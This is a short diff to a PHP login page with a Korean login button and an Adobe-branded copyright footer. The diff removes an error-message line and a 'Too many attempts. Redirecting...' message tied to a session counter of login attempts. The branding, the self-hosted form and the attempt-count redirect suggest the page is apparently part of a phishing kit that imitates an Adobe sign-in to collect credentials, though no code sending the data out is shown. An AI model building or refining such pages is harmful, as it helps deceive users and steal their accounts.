@@ -142,8 +142,7 @@
                 <label for="remember-me">Remember me</label>
             </div>
             <button type="submit" id="submit-btn">로그인</button>
-                 <?php if (isset($errorMessage)) { echo "<p style='color:red;'>$errorMessage</p>"; } ?>
-        <?php if (isset($_SESSION['attempts']) && $_SESSION['attempts'] >= 4) { echo "<p style='color:red;'>Too many attempts. Redirecting...</p>"; } ?>
+     
             <!-- Copyright text inside form container -->
        </form>           <div class="copyright">&copy; 2025 Adobe By clicking Next, you accept Adobe Cloud Storage terms and conditions in accordance with our privacy policy.</div>
 </body>
